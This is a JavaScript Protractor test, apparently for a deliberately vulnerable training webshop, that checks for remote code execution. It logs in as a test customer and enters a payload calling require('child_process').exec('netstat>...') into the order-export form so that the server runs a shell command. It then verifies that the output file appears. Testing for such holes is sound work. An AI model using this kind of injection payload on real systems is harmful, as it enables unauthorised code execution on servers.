'use strict';
const fs = require('fs');
const path = require('path');
const HelperFunctions = require('../helperFunctions.js');

describe('RCE Injection', function () {

    beforeEach(function () {
        HelperFunctions.login(browser, 'customer0', 'compass0');
    });

    afterEach(function () {
        HelperFunctions.logout(browser);
    });

    describe('Environment Variable Check', function () {
        it('should be on', function () {
            if (process.env.NODE_RCE_EVAL !== 'ON' && process.env.NODE_RCE_EVAL !== 'on') {
                fail("Environment Variable not set");
            }
        });
    });

    describe('Try to run netstat command', function () {

        beforeEach(function() {
            browser.get(browser.params.webshop);
        });

        it('should be successfully', function () {
            let fileName = 'rceInjection.txt';

            element.all(by.css('.glyphicon.glyphicon-user')).get(0).click();
            browser.sleep(250);
            //Link
            element(by.linkText('My Orders')).click();
            browser.sleep(250);
            //Fill form
            element(by.model('orders.export.from')).sendKeys("1");
            element(by.model('orders.export.range')).sendKeys("require('child_process').exec('netstat>" + fileName + "')");
            element(by.buttonText('Export pdf')).click();

            let filePath = '../../../' + fileName;

            browser.wait(function() {
                try {
                    fs.accessSync(path.join(__dirname, filePath), fs.constants.F_OK);
                    return true;
                } catch (error) {
                    return false;
                }
            }, 5000).then(function(exists) {
                expect(exists).toBe(true);
            }).then(function() {
                browser.wait(function() {
                    try {
                        fs.unlinkSync(path.join(__dirname, filePath));
                        return true;
                    } catch (error) {
                        return false;
                    }
                }, 5000).then(function(unlinked) {
                    expect(unlinked).toBe(true);
                });
            });
        });
    });
});
